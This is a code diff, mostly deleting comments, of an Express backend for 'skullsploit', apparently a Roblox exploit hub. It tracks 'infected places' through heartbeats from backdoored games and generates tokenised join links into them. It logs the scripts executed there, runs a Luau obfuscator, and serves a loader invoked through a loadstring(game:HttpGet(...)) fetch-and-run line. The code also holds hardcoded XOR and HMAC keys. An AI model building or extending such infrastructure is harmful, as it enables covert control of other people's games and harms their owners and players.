@@ -8,7 +8,6 @@ const luaobf = require('./lib/luaobf');
 
 const app = express();
 
-// ----- config -----
 const PORT = process.env.PORT || 3000;
 const PROD = process.env.NODE_ENV === 'production';
 
@@ -28,31 +27,21 @@ const MORPH_WL_FILE        = path.join(DATA_DIR, 'morph-whitelist.json');
 const MORPH_LOG_FILE       = path.join(DATA_DIR, 'morph-log.json');
 const SECRET_FILE  = path.join(DATA_DIR, '.session-secret');
 
-const LOG_MAX   = 2000;     // execution log entries
-const AUDIT_MAX = 5000;     // audit log entries
+const LOG_MAX   = 2000;     
+const AUDIT_MAX = 5000;     
 
-// the bootstrap owner. always promoted to owner on startup. cannot be deleted.
-// override with env OWNER_USERNAME.
 const OWNER_USERNAME = (process.env.OWNER_USERNAME || 'bruvo').trim();
 
-// optional shared secret for the Roblox -> /api/games/heartbeat call.
-// if set, the heartbeat body must include { secret: HEARTBEAT_SECRET } or the request is rejected.
-// leave unset to keep the endpoint open (rate-limited only).
 const HEARTBEAT_SECRET = (process.env.HEARTBEAT_SECRET || '').trim();
 
-
-// auto-stale policy for the persistent places registry. places whose lastSeen is older
-// than this many days get pruned automatically. set PLACE_STALE_DAYS=0 to keep forever.
-// default: 30 days.
 const PLACE_STALE_DAYS = (() => {
   const raw = process.env.PLACE_STALE_DAYS;
   if (raw === undefined || raw === '') return 30;
   const n = parseInt(raw, 10);
   return Number.isFinite(n) && n >= 0 ? n : 30;
 })();
-const PLACE_PRUNE_INTERVAL_MS = 60 * 60 * 1000; // run pruner every hour
+const PLACE_PRUNE_INTERVAL_MS = 60 * 60 * 1000; 
 
-// ----- helpers -----
 function loadSessionSecret() {
   if (process.env.SESSION_SECRET) return process.env.SESSION_SECRET;
   fs.mkdirSync(DATA_DIR, { recursive: true });
@@ -93,7 +82,7 @@ function seed() {
       createdAt: new Date().toISOString()
     }]);
   } else {
-    // migration: ensure the bootstrap owner has isOwner=true; ensure at least one owner exists
+    
     const devs = readJson(DEVS_FILE, []);
     let changed = false;
     const bootstrap = devs.find(d => d.username === OWNER_USERNAME);
@@ -114,9 +103,6 @@ function seed() {
 }
 seed();
 
-// One-time migration: copy all built-in morphs from morphs.json into the custom
-// store so the owner can edit/delete every entry from /morphs. Marker file
-// guards re-imports. To re-run, delete data/.morph-imported.
 const MORPH_IMPORTED_FLAG = path.join(DATA_DIR, '.morph-imported');
 (function migrateBuiltinsIfNeeded() {
   if (fs.existsSync(MORPH_IMPORTED_FLAG)) return;
@@ -140,9 +126,6 @@ const MORPH_IMPORTED_FLAG = path.join(DATA_DIR, '.morph-imported');
   console.log(`[morphs] migrated ${added}/${builtinNames.length} built-in morphs into custom store`);
 })();
 
-// ----- infected places registry (persistent) -----
-// every game that has ever heartbeated is remembered here, so a place still shows
-// up in /games even if it has no live servers right now. flushed to disk lazily.
 const infectedPlaces = new Map();
 let placesDirty = false;
 (function loadInfectedPlaces() {
@@ -162,7 +145,6 @@ setInterval(savePlacesIfDirty, 60 * 1000).unref();
 process.on('SIGTERM', savePlacesIfDirty);
 process.on('SIGINT', () => { savePlacesIfDirty(); process.exit(0); });
 
-// auto-stale pruner: drop places that haven't heartbeated in PLACE_STALE_DAYS days.
 function pruneStalePlaces() {
   if (PLACE_STALE_DAYS <= 0) return 0;
   const cutoff = Date.now() - PLACE_STALE_DAYS * 24 * 3600 * 1000;
@@ -191,7 +173,6 @@ setInterval(pruneStalePlaces, PLACE_PRUNE_INTERVAL_MS).unref();
 
 if (PROD) app.set('trust proxy', 1);
 
-// ----- security headers -----
 app.use((req, res, next) => {
   res.setHeader('X-Content-Type-Options', 'nosniff');
   res.setHeader('X-Frame-Options', 'DENY');
@@ -204,7 +185,7 @@ app.use((req, res, next) => {
     "script-src 'self' 'unsafe-inline'",
     "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
     "font-src 'self' https://fonts.gstatic.com data:",
-    // allow Roblox CDN for game icons
+    
     "img-src 'self' data: https://*.rbxcdn.com https://www.roblox.com https://tr.rbxcdn.com",
     "connect-src 'self'",
     "frame-ancestors 'none'",
@@ -233,7 +214,6 @@ app.use(session({
   }
 }));
 
-// ----- rate limiting -----
 const buckets = new Map();
 function rateLimit({ windowMs, max, message = 'too many requests, please slow down' }) {
   return (req, res, next) => {
@@ -268,14 +248,9 @@ const writeLimiter     = rateLimit({ windowMs: 60 * 1000,      max: 60,  message
 const auditLimiter     = rateLimit({ windowMs: 60 * 1000,      max: 60,  message: 'too many requests' });
 const morphCheckLimiter= rateLimit({ windowMs: 60 * 1000,      max: 120, message: 'too many checks' });
 const morphLogLimiter  = rateLimit({ windowMs: 60 * 1000,      max: 240, message: 'too many uses logged' });
-// Tight cap on /api/morphs/entry: a legit player firing morphs hits this once
-// per unique morph (then the in-game cache covers repeats). A scraper trying
-// to pull the whole catalog (~7000 entries) would have to spend ~4 hours per
-// IP at this rate. Combined with the one-time-use nonce requirement, that
-// makes mass scraping prohibitively painful.
+
 const morphEntryLimiter= rateLimit({ windowMs: 60 * 1000,      max: 30,  message: 'too many morph fetches' });
 
-// ----- in-memory state -----
 const HEARTBEAT_TTL = 30 * 1000;
 const ACTIVITY_WINDOW = 24 * 60 * 60 * 1000;
 
@@ -296,7 +271,6 @@ app.use((req, res, next) => {
   next();
 });
 
-// ----- audit log -----
 function audit(req, event, target, details = {}) {
   try {
     const u = req && req.session && req.session.user;
@@ -315,12 +289,11 @@ function audit(req, event, target, details = {}) {
     if (all.length > AUDIT_MAX) all.length = AUDIT_MAX;
     writeJson(AUDIT_FILE, all);
   } catch (e) {
-    // never let audit failure break a request
+    
     console.error('[audit]', e && e.message);
   }
 }
 
-// ----- key helpers -----
 function genKey() {
   const raw = crypto.randomBytes(12).toString('hex').toUpperCase();
   return `SKL-${raw.slice(0,4)}-${raw.slice(4,8)}-${raw.slice(8,12)}-${raw.slice(12,16)}-${raw.slice(16,20)}-${raw.slice(20,24)}`;
@@ -329,7 +302,6 @@ function genKey() {
 const USERNAME_RE = /^[a-zA-Z0-9_-]+$/;
 function validUsername(u) { return typeof u === 'string' && u.length >= 3 && u.length <= 24 && USERNAME_RE.test(u); }
 
-// ----- session helpers -----
 function userStillExists(session) {
   if (!session || !session.user) return false;
   const { username, kind } = session.user;
@@ -343,8 +315,7 @@ function isOwnerUsername(username) {
   const d = devs.find(x => x.username === username);
   return !!(d && d.isOwner);
 }
-// Devs always have morph access. Regular users need to be promoted by an owner
-// (sets isMorph=true on their users.json record).
+
 function hasMorphAccess(username) {
   if (!username) return false;
   const devs = readJson(DEVS_FILE, []);
@@ -393,18 +364,12 @@ function requireMorphAccess(req, res, next) {
   if (!hasMorphAccess(u.username)) return res.status(403).json({ error: 'morph access required' });
   next();
 }
-// Shared XOR key with the Roblox MainModule. Used to obfuscate the username
-// in ?u= so that drive-by scrapers can't just guess plaintext usernames.
-// NOT real security on its own — anyone who can decompile the published
-// model can extract this key. The HMAC tag below adds the actual auth.
+
 const MORPH_USERNAME_KEY = Buffer.from(
   '8c5eb959e260fa77680c7466f16c9ad7f7d94f19ed52dc122a9362b722e99b2f',
   'hex'
 );
-// HMAC-SHA256 key shared with MainModule. Used to sign every morph API
-// request alongside a server-issued one-time nonce. Even an attacker who
-// extracts BOTH keys must continuously fetch fresh nonces from the rate-
-// limited /api/morphs/nonce endpoint to forge requests.
+
 const MORPH_MAC_KEY = Buffer.from(
   'bb9d2ccc55c3df174e693c79c41c3f6111a8606e85214783615a805532b590ee',
   'hex'
@@ -412,9 +377,6 @@ const MORPH_MAC_KEY = Buffer.from(
 const MORPH_REPLAY_WINDOW_MS = 5 * 60 * 1000;
 const MORPH_NONCE_TTL_MS = 60 * 1000;
 
-// In-memory one-time-use nonce store. Map<nonceHex, expiresAtMs>.
-// Pruned every 30s. On server restart, all in-flight nonces become invalid —
-// clients retry with a fresh nonce, no user-visible breakage.
 const morphNonces = new Map();
 function pruneMorphNonces() {
   const now = Date.now();
@@ -432,7 +394,7 @@ function consumeMorphNonce(n) {
   const exp = morphNonces.get(n);
   if (!exp) return false;
   if (exp < Date.now()) { morphNonces.delete(n); return false; }
-  morphNonces.delete(n); // one-time-use
+  morphNonces.delete(n); 
   return true;
 }
 function expectedMorphMac(message) {
@@ -467,17 +429,6 @@ function decryptMorphUsername(hex) {
   return username;
 }
 
-// Gates the public morph endpoints. Two ways to pass:
-//   1. Logged-in morph-access user via session cookie (admin UI on /morphs).
-//   2. ?u=<hex>&n=<nonce>&t=<unixSec>&s=<hmacHex>
-//      MainModule first fetches a nonce from /api/morphs/nonce, then signs
-//      (u + ":" + n + ":" + t) with MORPH_MAC_KEY. Server consumes the nonce
-//      (one-time use) and verifies the HMAC before decrypting the username.
-//      Captured tokens can't be replayed; bit-flipped tokens fail HMAC check.
-//
-// Transition note: if the client sends `u` without `n/t/s`, we currently
-// fall through to the legacy XOR-only check. Once MainModule is republished,
-// MORPH_REQUIRE_HMAC=1 turns the strict mode on.
 const MORPH_REQUIRE_HMAC = process.env.MORPH_REQUIRE_HMAC === '1';
 
 function requireMorphToken(req, res, next) {
@@ -531,7 +482,6 @@ function ensureGameToken(record, file, all) {
   return record.gameToken;
 }
 
-// ===== AUTH =====
 app.post('/api/auth/signup', signupLimiter, (req, res) => {
   const { key, username, password } = req.body || {};
   if (typeof key !== 'string' || typeof username !== 'string' || typeof password !== 'string') {
@@ -547,7 +497,7 @@ app.post('/api/auth/signup', signupLimiter, (req, res) => {
   if (k.consumed)                                          return res.status(403).json({ error: 'this key has already been used' });
   if (k.revoked)                                           return res.status(403).json({ error: 'this key has been revoked' });
   if (k.expiresAt && new Date(k.expiresAt) < new Date())   return res.status(403).json({ error: 'this key has expired' });
-  // key is bound to a specific username
+  
   if (k.boundUsername && k.boundUsername !== username)     return res.status(403).json({ error: `this key is reserved for username "${k.boundUsername}"` });
 
   const users = readJson(USERS_FILE, []);
@@ -578,10 +528,6 @@ app.post('/api/auth/signup', signupLimiter, (req, res) => {
   });
 });
 
-// Pre-computed bcrypt hash of a random throwaway. We bcrypt-compare against
-// this when no user is found so every login takes the same amount of time
-// regardless of whether the username exists. Closes timing-based username
-// enumeration.
 const DUMMY_PASSWORD_HASH = bcrypt.hashSync(crypto.randomBytes(24).toString('hex'), 10);
 
 app.post('/api/auth/login', loginLimiter, (req, res) => {
@@ -600,8 +546,8 @@ app.post('/api/auth/login', loginLimiter, (req, res) => {
   let bucketAll = devs;
   if (!user) { user = users.find(u => u.username === username); kind = 'user'; bucketFile = USERS_FILE; bucketAll = users; }
 
-  // Always run bcrypt to keep timing constant. If the user doesn't exist we
-  // hash against a random hash that nothing will ever match.
+  
+  
   const hashToCheck = user ? user.passwordHash : DUMMY_PASSWORD_HASH;
   const passwordOk = bcrypt.compareSync(password, hashToCheck);
   if (!user || !passwordOk) {
@@ -634,7 +580,6 @@ app.get('/api/session', (req, res) => {
   res.json({ user: { ...u, isOwner, isMorph } });
 });
 
-// ===== DEVS (owner only) =====
 app.get('/api/devs', requireOwner, (req, res) => {
   const devs = readJson(DEVS_FILE, []);
   res.json({
@@ -681,7 +626,7 @@ app.delete('/api/devs/:username', writeLimiter, requireOwner, (req, res) => {
   let devs = readJson(DEVS_FILE, []);
   const dev = devs.find(d => d.username === target);
   if (!dev) return res.status(404).json({ error: 'not found' });
-  // require demote first if removing another owner
+  
   if (dev.isOwner) return res.status(400).json({ error: 'demote this owner before removing' });
   devs = devs.filter(d => d.username !== target);
   writeJson(DEVS_FILE, devs);
@@ -711,7 +656,7 @@ app.post('/api/devs/:username/demote', writeLimiter, requireOwner, (req, res) =>
   const d = devs.find(x => x.username === target);
   if (!d) return res.status(404).json({ error: 'not found' });
   if (!d.isOwner) return res.json({ ok: true, isOwner: false });
-  // ensure at least one owner remains
+  
   const owners = devs.filter(x => x.isOwner).length;
   if (owners <= 1) return res.status(400).json({ error: 'must keep at least one owner' });
   d.isOwner = false;
@@ -720,7 +665,6 @@ app.post('/api/devs/:username/demote', writeLimiter, requireOwner, (req, res) =>
   res.json({ ok: true, isOwner: false });
 });
 
-// ===== USERS (owner only — for managing the morph role) =====
 app.get('/api/users', requireOwner, (req, res) => {
   const users = readJson(USERS_FILE, []);
   res.json({
@@ -763,7 +707,6 @@ app.post('/api/users/:username/demote-morph', writeLimiter, requireOwner, (req, 
   res.json({ ok: true, isMorph: false });
 });
 
-// ===== KEYS (owner only) =====
 app.get('/api/keys', requireOwner, (req, res) => {
   res.json({ keys: readJson(KEYS_FILE, []) });
 });
@@ -775,7 +718,7 @@ app.post('/api/keys', writeLimiter, requireOwner, (req, res) => {
   const devs  = readJson(DEVS_FILE, []);
   const users = readJson(USERS_FILE, []);
   const keys  = readJson(KEYS_FILE, []);
-  // username must be unique across devs, users, AND unconsumed keys (no double-reservation)
+  
   if (devs.find(d => d.username === username) || users.find(u => u.username === username)) {
     return res.status(409).json({ error: 'that username is already taken by an account' });
   }
@@ -832,7 +775,6 @@ app.delete('/api/keys/:key', writeLimiter, requireOwner, (req, res) => {
   res.json({ ok: true, removedUsers });
 });
 
-// ===== SCRIPTS =====
 const CATEGORIES = ['script', 'gui', 'morph'];
 function normCategory(c) {
   const v = String(c || '').toLowerCase().trim();
@@ -919,7 +861,6 @@ app.post('/api/scripts/import', writeLimiter, requireDev, (req, res) => {
   res.json({ ok: true, imported: imported.length, skipped: skipped.length, skippedDetail: skipped.slice(0, 20) });
 });
 
-// edit your own script
 app.patch('/api/scripts/:id', writeLimiter, requireDev, (req, res) => {
   const scripts = readJson(SCRIPTS_FILE, []);
   const s = scripts.find(x => x.id === req.params.id);
@@ -963,7 +904,6 @@ app.delete('/api/scripts/:id', writeLimiter, requireDev, (req, res) => {
   res.json({ ok: true });
 });
 
-// ----- luau obfuscator (dev-only) -----
 app.post('/api/obfuscate', writeLimiter, requireDev, (req, res) => {
   const source = (req.body && typeof req.body.source === 'string') ? req.body.source : '';
   if (!source.trim()) return res.status(400).json({ error: 'source is empty' });
@@ -994,47 +934,35 @@ app.post('/api/obfuscate', writeLimiter, requireDev, (req, res) => {
   res.json({ ok: true, output: r.output, stats: r.stats });
 });
 
-// ----- morph hub (separate from skullsploit's gated content) -----
-// The morph GUI is a standalone Roblox tool. Skullsploit only hosts the
-// whitelist + the loader script + usage logs. The whitelist gate is
-// username-based (player runs the loader; loader hits /api/morphs/check
-// with their Roblox username).
-
 const ROBLOX_NAME_RE = /^[A-Za-z0-9_]{3,20}$/;
 
-// Issues a fresh one-time-use 60-second nonce. Required for any signed
-// morph request. Rate-limited like the rest of the public morph endpoints.
-// No auth needed — a nonce alone is useless without MORPH_MAC_KEY.
 app.get('/api/morphs/nonce', morphCheckLimiter, (req, res) => {
   const nonce = issueMorphNonce();
   res.json({ nonce, expires: Date.now() + MORPH_NONCE_TTL_MS });
 });
 
 app.get('/api/morphs', morphCheckLimiter, requireMorphToken, (req, res) => {
-  // Returns the morph catalog. For admin (session) callers we hand back full
-  // entries because the admin UI uses /api/morphs/custom anyway; this branch
-  // is mostly a courtesy. For Roblox (HMAC) callers we strip down to NAMES
-  // ONLY — the actual `require()` id, method, style, args for any single
-  // morph is fetched just-in-time from /api/morphs/entry when the player
-  // clicks it. That changes scraping the catalog from one cheap fetch into
-  // ~7000 individually-signed, individually-nonced, rate-limited fetches.
+  
+  
+  
+  
+  
+  
+  
   const all = readJson(MORPH_CUSTOM_FILE, {});
   const sessUser = req.session && req.session.user;
   if (sessUser && hasMorphAccess(sessUser.username)) {
     return res.json({ morphs: all, username: req.morphUser || null });
   }
-  // Names-only map. Kept as `{name: {}}` (object → empty-object) so the
-  // in-game ClientHandler — which iterates via `pairs()` and does
-  // `e.__name = name` on each value — still works without changes. The
-  // values carry no morph data; the real entry is fetched at click time.
+  
+  
+  
+  
   const names = {};
   for (const k of Object.keys(all)) names[k] = {};
   res.json({ morphs: names, username: req.morphUser || null });
 });
 
-// Single-entry fetch. Used by MainModule's fireFor() right before calling
-// `require(N).method(args)`. The full per-morph payload is only handed out
-// one-at-a-time, gated by HMAC + nonce + a tight per-IP rate limit.
 app.get('/api/morphs/entry', morphEntryLimiter, requireMorphToken, (req, res) => {
   const name = String((req.query && req.query.name) || '').trim();
   if (!name || !CUSTOM_NAME_RE.test(name)) return res.status(400).json({ error: 'invalid name' });
@@ -1044,8 +972,6 @@ app.get('/api/morphs/entry', morphEntryLimiter, requireMorphToken, (req, res) =>
   res.json({ entry: all[key], username: req.morphUser || null });
 });
 
-// Helper: find a custom-morph entry by case-insensitive name match.
-// Returns the actual stored key so subsequent operations write under the right name.
 function findCustomKey(all, target) {
   if (all[target]) return target;
   const lower = String(target).toLowerCase();
@@ -1055,7 +981,6 @@ function findCustomKey(all, target) {
   return null;
 }
 
-// ----- custom morph CRUD (owner only) -----
 const CUSTOM_NAME_RE  = /^[A-Za-z0-9_\- ]{1,40}$/;
 const CUSTOM_STYLES   = new Set(['args', 'colon', 'call', 'model']);
 
@@ -1076,8 +1001,8 @@ app.post('/api/morphs/custom', writeLimiter, requireMorphAccess, (req, res) => {
   if (!CUSTOM_STYLES.has(style)) return res.status(400).json({ error: 'style must be args, colon, call, or model' });
   if ((style === 'args' || style === 'colon') && !method) return res.status(400).json({ error: 'method required for args/colon styles' });
 
-  // Args: array of strings/numbers. Use the literal string "USERNAME" as a
-  // placeholder — it gets substituted with the player's roblox name at fire time.
+  
+  
   let args = null;
   if (Array.isArray(argsRaw)) {
     args = [];
@@ -1085,7 +1010,7 @@ app.post('/api/morphs/custom', writeLimiter, requireMorphAccess, (req, res) => {
       if (typeof a === 'string') args.push(a.slice(0, 200));
       else if (typeof a === 'number' && Number.isFinite(a)) args.push(a);
       else if (typeof a === 'boolean') args.push(a);
-      // skip anything else
+      
     }
     if (args.length === 0) args = null;
   }
@@ -1115,8 +1040,6 @@ app.delete('/api/morphs/custom/:name', writeLimiter, requireMorphAccess, (req, r
   res.json({ ok: true, name: key });
 });
 
-// Update an existing custom morph in place. Any field can be partially updated.
-// Pass `newName` to also rename the entry (the URL still uses the OLD name).
 app.patch('/api/morphs/custom/:name', writeLimiter, requireMorphAccess, (req, res) => {
   const target = String(req.params.name || '').trim();
   const all = readJson(MORPH_CUSTOM_FILE, {});
@@ -1157,7 +1080,7 @@ app.patch('/api/morphs/custom/:name', writeLimiter, requireMorphAccess, (req, re
     if (b.noUsername === true) entry.noUsername = true;
     else delete entry.noUsername;
   }
-  // Final shape sanity: args/colon styles still need a method
+  
   if ((entry.style === 'args' || entry.style === 'colon') && !entry.method) {
     return res.status(400).json({ error: 'method required for args/colon styles' });
   }
@@ -1165,13 +1088,13 @@ app.patch('/api/morphs/custom/:name', writeLimiter, requireMorphAccess, (req, re
   entry.updatedAt = new Date().toISOString();
   entry.updatedBy = req.session.user.username;
 
-  // Optional rename
+  
   let finalName = key;
   if (b.newName && typeof b.newName === 'string') {
     const nn = b.newName.trim();
     if (nn !== key) {
       if (!CUSTOM_NAME_RE.test(nn)) return res.status(400).json({ error: 'new name must be 1-40 chars (A-Z 0-9 _ - space)' });
-      // case-insensitive conflict check, but allow rename to a different case of the same key
+      
       const conflict = findCustomKey(all, nn);
       if (conflict && conflict !== key) return res.status(409).json({ error: 'a morph with that name already exists' });
       delete all[key];
@@ -1194,8 +1117,8 @@ app.patch('/api/morphs/custom/:name', writeLimiter, requireMorphAccess, (req, re
 });
 
 app.get('/api/morphs/check', morphCheckLimiter, requireMorphToken, (req, res) => {
-  // requireMorphToken already verified the encrypted ?u= AND that the resolved
-  // username is on the whitelist. If we got here, the answer is yes.
+  
+  
   const wl = readJson(MORPH_WL_FILE, []);
   const entry = wl.find(e => e.username.toLowerCase() === (req.morphUser || '').toLowerCase());
   if (!entry) return res.json({ ok: true });
@@ -1210,14 +1133,14 @@ app.post('/api/morphs/log', morphLogLimiter, requireMorphToken, (req, res) => {
   if (!ROBLOX_NAME_RE.test(username)) return res.status(400).json({ error: 'invalid username' });
   if (morph.length > 80) return res.status(400).json({ error: 'morph name too long' });
 
-  // The signed identity (req.morphUser, resolved from the HMAC'd ?u= param)
-  // must match the username being logged. Otherwise anyone with a valid
-  // signature could forge log entries under a different name.
+  
+  
+  
   if (req.morphUser && username.toLowerCase() !== String(req.morphUser).toLowerCase()) {
     return res.status(403).json({ error: 'forbidden' });
   }
 
-  // verify the actor IS whitelisted before accepting their log
+  
   const wl = readJson(MORPH_WL_FILE, []);
   const isWhitelisted = wl.some(e => e.username.toLowerCase() === username.toLowerCase());
   if (!isWhitelisted) return res.status(403).json({ error: 'not whitelisted' });
@@ -1235,7 +1158,6 @@ app.post('/api/morphs/log', morphLogLimiter, requireMorphToken, (req, res) => {
   res.json({ ok: true });
 });
 
-// ----- owner-only management -----
 app.get('/api/morphs/whitelist', requireMorphAccess, (req, res) => {
   res.json({ entries: readJson(MORPH_WL_FILE, []) });
 });
@@ -1278,32 +1200,12 @@ app.get('/api/morphs/log', requireMorphAccess, (req, res) => {
   res.json({ logs: all.slice(0, limit) });
 });
 
-// Render a Buffer as a Lua double-quoted string of \xNN escapes — used to
-// embed our binary XOR + HMAC keys into the loader source.
 function bufToLuaEscape(buf) {
   let s = '';
   for (let i = 0; i < buf.length; i++) s += '\\x' + buf[i].toString(16).padStart(2, '0');
   return s;
 }
 
-// Public loader served as plain text/lua. Hits the secured morph API using
-// the same HMAC + one-time-nonce protocol as MainModule, then builds the
-// morph GUI inline (no Roblox asset dependency). Player usage:
-//
-//   loadstring(game:HttpGet("https://skullsploit.com/m.lua"))()
-//
-// Auto-runs on load. No `require()` involved, so it survives the published
-// MainModule asset getting flagged off the Creator Store. Works in any
-// context that gives us an HTTP-get primitive (game:HttpGet from most
-// executors, request() from Synapse-style frameworks, or HttpService for
-// server-side use).
-//
-// The XOR + HMAC keys are interpolated into the source. They're the same
-// keys baked into MainModule — leaking either is equivalent to decompiling
-// the published model, so we accept that exposure. Server-side defenses
-// (one-time nonces, rate limits, whitelist gate, per-entry single-fetch)
-// remain the real boundary; the keys alone get an attacker nothing without
-// a whitelisted username and per-fetch nonces consumed at 30/min/IP.
 function buildMorphLoader(baseUrl) {
   const xorKey = bufToLuaEscape(MORPH_USERNAME_KEY);
   const macKey = bufToLuaEscape(MORPH_MAC_KEY);
@@ -1702,9 +1604,9 @@ print("[morphs] loaded \xc2\xb7 " .. #names .. " entries \xc2\xb7 welcome, " .. 
 }
 
 app.get('/m.lua', (req, res) => {
-  // Prefer a configured SITE_URL when set; otherwise derive from the request
-  // and strip anything that could break out of the Lua string literal we
-  // interpolate the value into (quotes, backslashes, newlines, control chars).
+  
+  
+  
   let baseUrl = (process.env.SITE_URL || `${req.protocol}://${req.get('host') || ''}`).trim();
   baseUrl = baseUrl.replace(/[^A-Za-z0-9:/._\-]/g, '');
   if (!/^https?:\/\//.test(baseUrl)) baseUrl = 'http://localhost:3000';
@@ -1725,7 +1627,6 @@ app.post('/api/scripts/:id/like', likeLimiter, requireUser, (req, res) => {
   res.json({ ok: true, liked, count: s.likes.length });
 });
 
-// ===== GAMES =====
 function bucketFor(n) {
   if (n >= 1000) return '1k+';
   if (n >= 100) return '100-1k';
@@ -1733,8 +1634,6 @@ function bucketFor(n) {
   return '0-25';
 }
 
-// build a usable thumbnail URL. trust the heartbeat's URL only if it's an https roblox cdn url;
-// otherwise fall back to the legacy asset-thumbnail URL based on placeId.
 function thumbUrlFor(placeId, raw) {
   if (typeof raw === 'string') {
     const r = raw.trim();
@@ -1759,8 +1658,7 @@ function getMyToken(username) {
 function buildJoinUrl(placeId, jobId, token) {
   return `https://www.roblox.com/games/start?placeId=${encodeURIComponent(placeId)}&gameInstanceId=${encodeURIComponent(jobId)}&launchData=${encodeURIComponent(token)}`;
 }
-// placeId-only join URL: lets Roblox route us to any available server, or spin a new one up.
-// useful for offline places where every previous jobId is dead.
+
 function buildTryJoinUrl(placeId, token) {
   return `https://www.roblox.com/games/start?placeId=${encodeURIComponent(placeId)}&launchData=${encodeURIComponent(token)}`;
 }
@@ -1772,7 +1670,7 @@ app.get('/api/games', requireUser, (req, res) => {
 
   const byPlace = new Map();
 
-  // 1) seed with every place we've ever seen so offline places still list
+  
   for (const p of infectedPlaces.values()) {
     byPlace.set(p.placeId, {
       placeId: p.placeId,
@@ -1787,7 +1685,7 @@ app.get('/api/games', requireUser, (req, res) => {
     });
   }
 
-  // 2) overlay live servers (heartbeated within TTL)
+  
   const live = [...activeGames.values()].filter(g => g.lastSeen >= cutoff);
   for (const g of live) {
     if (!byPlace.has(g.placeId)) {
@@ -1824,7 +1722,7 @@ app.get('/api/games', requireUser, (req, res) => {
       grp.live = grp.servers.length > 0;
       return grp;
     })
-    // live games first (by player count); then offline by most recently seen
+    
     .sort((a, b) => {
       if (a.live !== b.live) return a.live ? -1 : 1;
       if (a.live) return b.totalPlayers - a.totalPlayers;
@@ -1833,7 +1731,6 @@ app.get('/api/games', requireUser, (req, res) => {
   res.json({ games });
 });
 
-// owner-only: forget a place (e.g. it's been cleansed or you don't want it shown)
 app.delete('/api/places/:placeId', writeLimiter, requireOwner, (req, res) => {
   const placeId = String(req.params.placeId || '').replace(/[^0-9]/g, '').slice(0, 32);
   if (!placeId) return res.status(400).json({ error: 'invalid placeId' });
@@ -1905,7 +1802,7 @@ app.post('/api/games/heartbeat', heartbeatLimiter, (req, res) => {
     lastSeen: Date.now()
   });
 
-  // record this place in the persistent registry so it stays listed even at 0 players
+  
   const nowIso = new Date().toISOString();
   let place = infectedPlaces.get(pid);
   if (!place) {
@@ -1948,7 +1845,6 @@ app.post('/api/games/verify-token', checkLimiter, (req, res) => {
   res.json({ valid: true, username: rec.username, kind });
 });
 
-// ===== EXECUTION LOGS =====
 app.post('/api/logs/execute', logLimiter, (req, res) => {
   const { token, robloxName, placeId, jobId, gameName, scriptTitle, scriptBody } = req.body || {};
   if (typeof token !== 'string' || !token) return res.status(400).json({ error: 'token required' });
@@ -1990,16 +1886,14 @@ app.get('/api/logs', requireDev, (req, res) => {
   res.json({ logs });
 });
 
-// ===== AUDIT LOG =====
 app.get('/api/audit', auditLimiter, requireOwner, (req, res) => {
   const limit = Math.min(Math.max(parseInt(req.query.limit, 10) || 500, 1), 2000);
   const logs = readJson(AUDIT_FILE, []).slice(0, limit);
   res.json({ logs });
 });
 
-// ===== STATIC + GATED PAGES =====
 app.use((req, res, next) => {
-  // block direct access to protected html files
+  
   if (req.path !== '/index.html' && req.path !== '/login.html' && req.path !== '/signup.html' && /\.html$/i.test(req.path)) {
     return res.status(404).send('not found');
   }
